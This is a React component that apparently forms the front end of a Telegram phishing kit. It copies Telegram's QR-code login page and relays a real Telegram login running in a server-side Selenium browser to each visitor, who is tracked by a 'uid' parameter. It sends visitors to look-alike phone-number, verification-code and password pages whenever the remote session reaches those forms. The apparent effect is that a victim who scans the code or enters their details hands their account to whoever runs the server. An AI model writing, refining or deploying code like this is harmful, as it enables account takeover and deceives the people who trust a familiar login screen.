import type { FC } from 'react';
import { useState, useEffect, useRef } from 'react';
import { io, Socket } from 'socket.io-client';
import { useNavigate } from 'react-router-dom';

import { Page } from '@/components/Page.tsx';
import { sessionManager } from '@/helpers/sessionManager';

/**
 * IndexPage Component
 * 
 * This component implements a synchronization mechanism to prevent race conditions
 * between the React app loading and the Selenium window being ready.
 * 
 * Key Features:
 * - Waits for Selenium window to be ready before allowing phone login
 * - Shows real-time status of Selenium connection
 * - Prevents multiple rapid clicks on the phone login button
 * - Handles disconnections and reconnections gracefully
 * - Provides timeout protection to prevent indefinite waiting
 * 
 * The synchronization prevents the error where users click the phone login button
 * before the Selenium window is ready, which would cause the click event to be missed.
 */
export const IndexPage: FC = () => {
  const navigate = useNavigate();
  const [isConnected, setIsConnected] = useState(false);
  const [sessionId, setSessionId] = useState<string>('');
  const [_loginStatus, setLoginStatus] = useState<string>('');
  const [realTimeQRCode, setRealTimeQRCode] = useState<string | null>(null);
  const [showRealTimeQR, setShowRealTimeQR] = useState(false);
  const [_isSessionReused, setIsSessionReused] = useState(false);
  const [isSeleniumReady, setIsSeleniumReady] = useState(false);
  const [seleniumStatus, setSeleniumStatus] = useState<string>('Waiting for Selenium...');
  const [isPhoneLoginLoading, setIsPhoneLoginLoading] = useState(false);
  const [phoneLoginButtonFound, setPhoneLoginButtonFound] = useState(false);
  const [uid, setUid] = useState<string | null>(null);
  
  const socketRef = useRef<Socket | null>(null);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    // Get device fingerprint and session
    const initializeSession = async () => {
      try {
        setLoginStatus('Initializing session...');
        
        // Get UID from session manager
        const currentUid = sessionManager.getUid();
        setUid(currentUid);
        
        if (!currentUid) {
          setLoginStatus('Error: UID parameter is required. Please access the app with ?uid=your_user_id');
          return;
        }
        
        // Start cross-tab listener
        sessionManager.startCrossTabListener();
        
        // Get or create session for this device
        const sessionResponse = await sessionManager.getOrCreateSession();
        setSessionId(sessionResponse.sessionId);
        setIsSessionReused(!sessionResponse.isNew);
        
        // Store session ID in localStorage for PhoneLoginPage access
        localStorage.setItem('telegram_session_id', sessionResponse.sessionId);
        sessionStorage.setItem('telegram_session_id', sessionResponse.sessionId);
        
        if (sessionResponse.isNew) {
          setLoginStatus('New session created');
        } else {
          setLoginStatus('Existing session reused');
          if (sessionResponse.existingSession) {
            if (sessionResponse.existingSession.username) {
              setLoginStatus(`Welcome back, ${sessionResponse.existingSession.username}!`);
            }
          }
        }
        
        // Start the Telegram login process
        startTelegramLogin(sessionResponse.sessionId);
        
      } catch (error) {
        console.error('❌ Failed to initialize session:', error);
        setLoginStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      }
    };

    initializeSession();

    // Listen for session changes from other tabs
    const handleSessionChanged = (event: CustomEvent) => {
      console.log('🔄 Session changed from another tab:', event.detail);
      const newSessionId = event.detail.sessionId;
      if (newSessionId && newSessionId !== sessionId) {
        setSessionId(newSessionId);
        setIsSessionReused(true);
        setLoginStatus('Session updated from another tab');
        
        // Restart Telegram login with the new session
        startTelegramLogin(newSessionId);
      }
    };

    window.addEventListener('sessionChanged', handleSessionChanged as EventListener);

    return () => {
      window.removeEventListener('sessionChanged', handleSessionChanged as EventListener);
    };
  }, []);

  useEffect(() => {
    if (socketRef.current) {
      // Listen for Selenium window connection events
      socketRef.current.on('chromeWindowConnected', (data) => {
        console.log('✅ Selenium window connected:', data);
        setIsSeleniumReady(true);
        setSeleniumStatus('Selenium ready');
      });

      // Listen for immediate test events from Chrome window
      socketRef.current.on('immediateTestReceived', (data) => {
        console.log('✅ Immediate test received from Chrome window:', data);
        setIsSeleniumReady(true);
        setSeleniumStatus('Selenium ready');
      });

      // Listen for Selenium status updates
      socketRef.current.on('telegramLoginUpdate', (data) => {
        if (data.event === 'status' && data.data && data.data.message) {
          if (data.data.message.includes('Chrome driver initialized') || 
              data.data.message.includes('Browser window opened')) {
            setIsSeleniumReady(true);
            setSeleniumStatus('Selenium ready');
          }
        }
        
        // Handle Selenium errors or disconnections
        if (data.event === 'error') {
          setIsSeleniumReady(false);
          setSeleniumStatus(`Selenium error: ${data.data?.error || 'Unknown error'}`);
        }
      });

      // Listen for session status responses
      socketRef.current.on('sessionStatus', (data) => {
        console.log('📊 Session status received:', data);
        if (data.sessionId === sessionId) {
          // If session is running or completed, Selenium is likely ready
          if (data.status === 'running' || data.status === 'completed') {
            console.log('✅ Session is active, Selenium should be ready');
            setIsSeleniumReady(true);
            setSeleniumStatus('Selenium ready (session active)');
          }
        }
      });

      // Listen for all sessions response
      socketRef.current.on('allSessions', (sessions) => {
        console.log('📋 All sessions received:', sessions);
        // Check if any session is active, which would indicate Selenium is ready
        const hasActiveSession = sessions.some((session: any) => 
          session.status === 'running' || session.status === 'completed'
        );
        if (hasActiveSession) {
          console.log('✅ Found active session, Selenium should be ready');
          setIsSeleniumReady(true);
          setSeleniumStatus('Selenium ready (active session found)');
          
          // Now check if the phone login button is actually present
          setTimeout(() => {
            checkPhoneLoginButtonInSelenium();
          }, 1000); // Wait a bit for the page to fully load
        }
      });

      // Listen for element check responses
      socketRef.current.on('elementCheckResult', (data) => {
        console.log('🔍 Element check result:', data);
        if (data.sessionId === sessionId && data.elementType === 'PHONE_LOGIN_BUTTON') {
          if (data.elementFound) {
            console.log('✅ Phone login button found in Selenium window!');
            setPhoneLoginButtonFound(true);
            setSeleniumStatus('Phone login button ready');
          } else {
            console.log('❌ Phone login button not found in Selenium window');
            setPhoneLoginButtonFound(false);
            setSeleniumStatus('Phone login button not found - waiting for page to load...');
          }
        }
      });

      // Listen for Selenium disconnection events
      socketRef.current.on('disconnect', () => {
        console.log('🔌 Socket disconnected from Selenium server');
        setIsSeleniumReady(false);
        setSeleniumStatus('Selenium server disconnected');
      });

      // Listen for reconnection events
      socketRef.current.on('reconnect', () => {
        console.log('🔌 Socket reconnected to Selenium server');
        setSeleniumStatus('Reconnecting to Selenium...');
        // Check session status after reconnection
        if (sessionId && socketRef.current) {
          socketRef.current.emit('getSessionStatus', sessionId);
        }
      });

      // Check if Selenium is already ready by requesting session status
      if (sessionId) {
        socketRef.current.emit('getSessionStatus', sessionId);
      }

      // Set a timeout to prevent indefinite waiting
      const timeoutId = setTimeout(() => {
        if (!isSeleniumReady) {
          setSeleniumStatus('Selenium timeout - please refresh the page');
          console.warn('⚠️ Selenium readiness timeout reached');
        }
      }, 30000); // 30 seconds timeout

      // Periodic check for Selenium readiness
      const checkInterval = setInterval(() => {
        if (socketRef.current && socketRef.current.connected && sessionId) {
          socketRef.current.emit('getSessionStatus', sessionId);
        }
      }, 5000); // Check every 5 seconds

      // Periodic check for phone login button
      const buttonCheckInterval = setInterval(() => {
        if (socketRef.current && socketRef.current.connected && sessionId && isSeleniumReady && !phoneLoginButtonFound) {
          console.log('🔄 Periodic check for phone login button...');
          checkPhoneLoginButtonInSelenium();
        }
      }, 3000); // Check every 3 seconds

      return () => {
        clearTimeout(timeoutId);
        clearInterval(checkInterval);
        clearInterval(buttonCheckInterval);
      };
    }
  }, [sessionId, isSeleniumReady]);

  // Separate effect to handle socket connection and event setup
  useEffect(() => {
    if (socketRef.current && socketRef.current.connected) {
      console.log('🔌 Socket connected, setting up Selenium event listeners');
      
      // Force a session status check to see if Selenium is already ready
      if (sessionId) {
        console.log('🔍 Checking session status for Selenium readiness...');
        socketRef.current.emit('getSessionStatus', sessionId);
        
        // Also check if there are any active sessions that might indicate Selenium is ready
        socketRef.current.emit('getAllSessions');
      }
    }
  }, [socketRef.current?.connected, sessionId]);

  // Effect to handle initial Selenium readiness detection
  useEffect(() => {
    if (socketRef.current && socketRef.current.connected && sessionId) {
      // Immediate check for Selenium readiness
      console.log('🚀 Initial Selenium readiness check...');
      
      // Check current session status
      socketRef.current.emit('getSessionStatus', sessionId);
      
      // Check all sessions to see if any are active
      socketRef.current.emit('getAllSessions');
      
      // Set a short timeout to check again
      const initialCheckTimeout = setTimeout(() => {
        if (socketRef.current && socketRef.current.connected && sessionId) {
          console.log('🔄 Re-checking Selenium readiness after initial delay...');
          socketRef.current.emit('getSessionStatus', sessionId);
        }
      }, 2000); // Check again after 2 seconds
      
      return () => clearTimeout(initialCheckTimeout);
    }
  }, [socketRef.current?.connected, sessionId]);

  // Reset loading state when session changes
  useEffect(() => {
    setIsPhoneLoginLoading(false);
  }, [sessionId]);


  // Function to check if phone login button is present in Selenium window
  const checkPhoneLoginButtonInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionId) {
      console.log('🔍 Checking if phone login button is present in Selenium window...');
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionId,
        elementType: 'PHONE_LOGIN_BUTTON',
        timestamp: new Date().toISOString()
      });
    }
  };

  const startTelegramLogin = (sessionId: string) => {
    // Connect to Socket.IO server
    const socket = io('http://localhost:3005', {
      transports: ['websocket', 'polling']
    });
    
    socketRef.current = socket;

    socket.on('connect', () => {
      console.log('Connected to Socket.IO server');
      setIsConnected(true);
    });

    socket.on('disconnect', () => {
      console.log('Disconnected from Socket.IO server');
      setIsConnected(false);
    });

    socket.on('qrCodeUpdate', (data) => {
      if (data.sessionId === sessionId) {
        setRealTimeQRCode(data.qrCodeData);
        setShowRealTimeQR(true);
        setLoginStatus('QR code received');
      }
    });

    // Start polling for QR code updates
    const startPolling = () => {
      pollingIntervalRef.current = setInterval(async () => {
        try {
          const response = await fetch(`http://localhost:3005/api/qr-update/${sessionId}`);
          const data = await response.json();
          
          if (data.qrCodeData) {
            setRealTimeQRCode(data.qrCodeData);
            setShowRealTimeQR(true);
            setLoginStatus('QR code update received');
          }
        } catch (error) {
          console.error('Polling error:', error);
        }
      }, 2000);
    };

    setTimeout(startPolling, 3000);

    socket.on('telegramLoginUpdate', (data) => {
      if (data.sessionId === sessionId) {
        setLoginStatus(`${data.event}: ${data.data?.message || 'Update received'}`);
        
        if (data.event === 'completed') {
          setLoginStatus('Login completed successfully!');
          console.log('✅ Login completed, navigating to SuccessPage...');
          // Navigate to success page after successful authentication
          navigate('/success');
        } else if (data.event === 'error') {
          setLoginStatus(`Error: ${data.data?.error || 'Unknown error'}`);
        } else if (data.event === 'password_form_detected') {
          console.log('🔐 Password form detected, checking current page...');
          setLoginStatus('Password form detected - checking current page...');
          
          // Check if we're on the IndexPage (not on other pages)
          const currentPath = window.location.pathname;
          if (currentPath !== '/') {
            console.log('✅ Not on IndexPage - ignoring password form detection');
            setLoginStatus('Not on IndexPage - ignoring event');
            return; // Don't navigate if we're not on the IndexPage
          }
          
          console.log('🔐 Password form detected, navigating to password page...');
          setLoginStatus('Password form detected - redirecting...');
          // Navigate to password page
          navigate(`/sign-in-password?sessionId=${encodeURIComponent(sessionId)}`);
        } else if (data.event === 'verification_form_detected') {
          console.log('📱 Verification form detected, checking current page...');
          setLoginStatus('Verification code form detected - checking current page...');
          
          // Check if we're on the IndexPage (not on other pages)
          const currentPath = window.location.pathname;
          if (currentPath !== '/') {
            console.log('✅ Not on IndexPage - ignoring verification form detection');
            setLoginStatus('Not on IndexPage - ignoring event');
            return; // Don't navigate if we're not on the IndexPage
          }
          
          console.log('📱 On IndexPage - navigating to verification page...');
          setLoginStatus('Verification code form detected - redirecting...');
          // Navigate to verification page - we need to get the phone number from Selenium first
          // For now, navigate without phone number and let the verification page handle it
          navigate(`/verification-code?sessionId=${encodeURIComponent(sessionId)}`);
        }
      }
    });

    // Start Telegram login process
    socket.emit('startTelegramLogin', {
      sessionId: sessionId,
      parameters: null,
      deviceHash: sessionManager.getDeviceHash(),
      uid: sessionManager.getUid()
    });

    setLoginStatus('Starting Telegram login process...');

    // Add window close event handlers
    const handleBeforeUnload = () => {
      if (socketRef.current && socketRef.current.connected) {
        socketRef.current.emit('closeSeleniumWindow', {
          sessionId: sessionId,
          timestamp: new Date().toISOString()
        });
      }
    };

    const handleUnload = () => {
      if (socketRef.current && socketRef.current.connected) {
        socketRef.current.emit('cleanupSession', {
          sessionId: sessionId,
          timestamp: new Date().toISOString()
        });
      }
    };

    window.addEventListener('beforeunload', handleBeforeUnload);
    window.addEventListener('unload', handleUnload);

    return () => {
      // Cleanup function
      window.removeEventListener('beforeunload', handleBeforeUnload);
      window.removeEventListener('unload', handleUnload);
      
      if (socketRef.current && socketRef.current.connected) {
        socketRef.current.emit('closeSeleniumWindow', {
          sessionId: sessionId,
          timestamp: new Date().toISOString()
        });
        
        setTimeout(() => {
          socketRef.current?.disconnect();
        }, 100);
      } else {
        socket.disconnect();
      }
      
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  };

  const goToPhoneLogin = () => {
    // Check if phone login button is found in Selenium window
    if (!phoneLoginButtonFound) {
      setSeleniumStatus('Please wait for phone login button to be ready...');
      return;
    }

    // Check if we have a valid session ID
    if (!sessionId) {
      setSeleniumStatus('No active session - please refresh the page');
      return;
    }

    // Check if socket is connected
    if (!socketRef.current || !socketRef.current.connected) {
      setSeleniumStatus('Socket connection lost - please refresh the page');
      return;
    }

    // Prevent multiple rapid clicks
    if (isPhoneLoginLoading) {
      return;
    }

    try {
      setIsPhoneLoginLoading(true);
      setSeleniumStatus('Initiating phone login...');
      
      // CRITICAL FIX: Set up confirmation listener BEFORE sending click command
      console.log('🔒 Setting up phone login confirmation listener...');
      socketRef.current.once('clickPhoneLoginButtonResult', (data) => {
        if (data.sessionId === sessionId && data.success) {
          console.log('✅ Selenium confirmed phone login button click!');
          setSeleniumStatus('Phone login button clicked successfully');
          
          // NOW navigate to phone login page after Selenium confirms
          const phoneLoginUrl = `/phone-login?sessionId=${encodeURIComponent(sessionId)}`;
          console.log('🔗 Navigating to phone login page after Selenium confirmation:', phoneLoginUrl);
          navigate(phoneLoginUrl);
          
          // Reset loading state
          setIsPhoneLoginLoading(false);
        } else if (data.sessionId === sessionId && !data.success) {
          console.log('❌ Phone login button click failed:', data.error);
          setSeleniumStatus(`Phone login failed: ${data.error}`);
          setIsPhoneLoginLoading(false);
        }
      });
      
      // Add timeout in case Selenium doesn't respond
      setTimeout(() => {
        if (isPhoneLoginLoading) {
          console.log('⚠️ Timeout waiting for Selenium confirmation - forcing navigation');
          setSeleniumStatus('Timeout - forcing navigation');
          setIsPhoneLoginLoading(false);
          
          const phoneLoginUrl = `/phone-login?sessionId=${encodeURIComponent(sessionId)}`;
          navigate(phoneLoginUrl);
        }
      }, 10000); // 10 second timeout
      
      // Send message to Selenium server to click the phone login button
      console.log('🚀 Sending phone login button click to Selenium...');
      console.log('📡 Socket state:', socketRef.current?.connected ? 'Connected' : 'Disconnected');
      console.log('🆔 Session ID:', sessionId);
      console.log('🎯 Selector:', 'a[href*="phone"]');
      
      socketRef.current.emit('clickPhoneLoginButton', {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
      });
      
      console.log('✅ Phone login request sent to Selenium server');
      
      // CRITICAL: Don't navigate immediately - wait for Selenium confirmation
      // navigate(phoneLoginUrl); // REMOVED - this was causing the desync!
      
    } catch (error) {
      console.error('❌ Error in goToPhoneLogin:', error);
      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsPhoneLoginLoading(false);
    }
  };

  console.log("!!! phoneLoginButtonFound -> ", phoneLoginButtonFound);
  console.log("!!! isPhoneLoginLoading -> ", isPhoneLoginLoading);

  return (
    <Page back={false}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Login Content Container - Centered in viewport, content left-aligned */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '280px',
          width: '100%'
        }}>
          {/* System Status Indicator - Only show when SHOW_DEBUG_INFO is true */}
          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
            <div style={{
              marginBottom: '24px',
              padding: '12px 16px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '8px',
              width: '100%',
              textAlign: 'center'
            }}>
            <div style={{
              fontSize: '14px',
              color: '#6c757d',
              marginBottom: '8px'
            }}>
              System Status
            </div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px'
            }}>
              <div style={{
                width: '8px',
                height: '8px',
                borderRadius: '50%',
                backgroundColor: phoneLoginButtonFound ? '#28a745' : '#ffc107'
              }} />
              <span style={{
                fontSize: '12px',
                color: phoneLoginButtonFound ? '#155724' : '#856404',
                fontWeight: '500'
              }}>
                {phoneLoginButtonFound ? 'Phone Login Ready' : 'Phone Login Loading...'}
              </span>
            </div>
            {!isSeleniumReady && (
              <div style={{
                fontSize: '11px',
                color: '#6c757d',
                marginTop: '4px'
              }}>
                {seleniumStatus}
              </div>
            )}
            {!isSeleniumReady && seleniumStatus.includes('timeout') && (
              <button
                onClick={() => {
                  setSeleniumStatus('Retrying Selenium connection...');
                  setIsSeleniumReady(false);
                  // Force a fresh session status check
                  if (socketRef.current && socketRef.current.connected && sessionId) {
                    socketRef.current.emit('getSessionStatus', sessionId);
                  }
                }}
                style={{
                  marginTop: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#007bff',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Retry Connection
              </button>
            )}
            {!isSeleniumReady && !seleniumStatus.includes('timeout') && (
              <button
                onClick={() => {
                  setSeleniumStatus('Manually checking phone login button...');
                  // Check if the phone login button is present in Selenium window
                  checkPhoneLoginButtonInSelenium();
                }}
                style={{
                  marginTop: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6c757d',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check Phone Login Button
              </button>
            )}
          </div>
          )}

          {/* Error Display for Missing UID */}
          {!uid && (
            <div style={{
              marginBottom: '24px',
              padding: '16px',
              backgroundColor: '#f8d7da',
              border: '1px solid #f5c6cb',
              borderRadius: '8px',
              textAlign: 'center'
            }}>
              <div style={{
                fontSize: '16px',
                color: '#721c24',
                fontWeight: '500',
                marginBottom: '8px'
              }}>
                ❌ UID Parameter Required
              </div>
              <div style={{
                fontSize: '14px',
                color: '#721c24',
                marginBottom: '12px'
              }}>
                Please access this app with a UID parameter in the URL.
              </div>
              <div style={{
                fontSize: '12px',
                color: '#721c24',
                fontFamily: 'monospace',
                backgroundColor: '#f1b0b7',
                padding: '8px',
                borderRadius: '4px'
              }}>
                Example: http://localhost:5173?uid=cmg12affy0000y0ct89jxl0j7
              </div>
            </div>
          )}

          {/* Debug Information (only show when SHOW_DEBUG_INFO is true) */}
          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
            <div style={{
              marginBottom: '16px',
              padding: '8px 12px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '4px',
              fontSize: '11px',
              color: '#6c757d'
            }}>
              <div style={{ fontWeight: '500', marginBottom: '4px' }}>Debug Info:</div>
              <div>UID: {uid || '❌ Missing'}</div>
              <div>Socket: {isConnected ? '✅ Connected' : '❌ Disconnected'}</div>
              <div>Session: {sessionId || 'None'}</div>
              <div>Selenium: {isSeleniumReady ? '✅ Ready' : '⏳ Waiting'}</div>
              <div>Phone Button: {phoneLoginButtonFound ? '✅ Found' : '⏳ Waiting'}</div>
              <div>Status: {seleniumStatus}</div>
            </div>
          )}



          {/* QR Code Container */}
          <div style={{
            position: 'relative',
            marginBottom: '24px',
            textAlign: 'left'
          }}>
            {showRealTimeQR && realTimeQRCode ? (
              // Display real-time QR code from Chrome window
              <div style={{
                width: '280px',
                height: '280px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                position: 'relative'
              }}>
                <div 
                  dangerouslySetInnerHTML={{ __html: realTimeQRCode }}
                  style={{
                    width: '280px',
                    height: '280px',
                    borderRadius: '4px'
                  }}
                />
                {/* Telegram Plane positioned in the center */}
                <div style={{
                  position: 'absolute',
                  top: '50%',
                  left: '50%',
                  transform: 'translate(-50%, -50%)',
                  pointerEvents: 'none',
                  zIndex: 10,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  borderRadius: '50%',
                  width: '54px',
                  height: '54px',
                  overflow: 'hidden'
                }}>
                  <img 
                    src="/tg-plane.gif"
                    alt="Telegram Plane"
                    style={{
                      width: '103%',
                      height: '103%'
                    }}
                  />
                </div>
              </div>
            ) : (
              // Show loading spinner while waiting for QR code
              <div style={{
                width: '280px',
                height: '280px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}>
                <div style={{
                  width: '40px',
                  height: '40px',
                  border: '3px solid transparent',
                  borderTop: '3px solid rgb(51,144,236)',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite'
                }} />
                <style>{`
                  @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                  }
                `}</style>
              </div>
            )}
          </div>

          {/* Main Heading */}
          <h1 style={{
            fontSize: '20px',
            color: '#000',
            margin: '0 0 20px 0',
            textAlign: 'left',
            lineHeight: '1.2',
            letterSpacing: '-0.02em',
            fontWeight: '400',
            maxWidth: '280px'
          }}>
            Log in to Telegram by QR Code
          </h1>

          {/* Instructions */}
          <div style={{
            marginBottom: '40px',
            textAlign: 'left',
            maxWidth: '400px'
          }}>
            <div style={{
              display: 'flex',
              flexDirection: 'column',
              gap: '14px',
              maxWidth: '280px'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px'
              }}>
                <div style={{
                  width: '24px',
                  height: '24px',
                  borderRadius: '50%',
                  backgroundColor: 'rgb(51,144,236)',
                  color: 'white',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '14px'
                }}>
                  1
                </div>
                <span style={{ color: '#333', fontSize: '16px', lineHeight: '1.4', flex: 1 }}>
                  Open Telegram on your phone
                </span>
              </div>
              
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px'
              }}>
                <div style={{
                  width: '24px',
                  height: '24px',
                  borderRadius: '50%',
                  backgroundColor: 'rgb(51,144,236)',
                  color: 'white',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '14px'
                }}>
                  2
                </div>
                <span style={{ color: '#333', fontSize: '16px', lineHeight: '1.4', flex: 1 }}>
                  Go to <b style={{ fontWeight: '500' }}>Settings &gt; Devices &gt; Link Desktop Device</b>
                </span>
              </div>
              
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px'
              }}>
                <div style={{
                  width: '24px',
                  height: '24px',
                  borderRadius: '50%',
                  backgroundColor: 'rgb(51,144,236)',
                  color: 'white',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '14px',
                  fontWeight: '300'
                }}>
                  3
                </div>
                <span style={{ color: '#333', fontSize: '16px', lineHeight: '1.4', flex: 1 }}>
                  Point your phone at this screen to confirm login
                </span>
              </div>
            </div>
          </div>

          {/* Phone Number Login Link */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'left'
          }}>
            {/* Selenium Status Display - Only show when SHOW_DEBUG_INFO is true */}
            {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
              <div style={{
                marginBottom: '16px',
                padding: '8px 12px',
                backgroundColor: phoneLoginButtonFound ? '#e8f5e8' : '#fff3cd',
                border: `1px solid ${phoneLoginButtonFound ? '#28a745' : '#ffc107'}`,
                borderRadius: '4px',
                fontSize: '14px',
                color: phoneLoginButtonFound ? '#155724' : '#856404'
              }}>
                {phoneLoginButtonFound ? 'Phone login button ready!' : 
                 isSeleniumReady ? 'Selenium ready, waiting for phone login button...' : 
                 seleniumStatus}
              </div>
            )}
            {phoneLoginButtonFound && !isPhoneLoginLoading && (
              <button
                onClick={goToPhoneLogin}
                disabled={!phoneLoginButtonFound || isPhoneLoginLoading}
                style={{
                  background: phoneLoginButtonFound && !isPhoneLoginLoading ? 'none' : '#f5f5f5',
                  border: 'none',
                  color: phoneLoginButtonFound && !isPhoneLoginLoading ? 'rgb(51,144,236)' : '#999',
                  fontSize: '16px',
                  cursor: phoneLoginButtonFound && !isPhoneLoginLoading ? 'pointer' : 'not-allowed',
                  textDecoration: 'none',
                  padding: '8px 16px',
                  borderRadius: '4px',
                  transition: 'background-color 0.2s',
                  letterSpacing: '0.02em',
                  opacity: phoneLoginButtonFound && !isPhoneLoginLoading ? 1 : 0.6,
                }}
                onMouseOver={(e) => {
                  if (phoneLoginButtonFound && !isPhoneLoginLoading) {
                    e.currentTarget.style.backgroundColor = '#f0f8ff';
                  }
                }}
                onMouseOut={(e) => {
                  if (phoneLoginButtonFound && !isPhoneLoginLoading) {
                    e.currentTarget.style.backgroundColor = 'transparent';
                  }
                }}
              >
                {isPhoneLoginLoading ? 'INITIATING...' : 
                phoneLoginButtonFound ? 'LOG IN BY PHONE NUMBER' : 
                import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'WAITING FOR PHONE LOGIN BUTTON...' : 'LOG IN BY PHONE NUMBER'}
              </button>
            )}
          </div>
        </div>
      </div>
    </Page>
  );
};
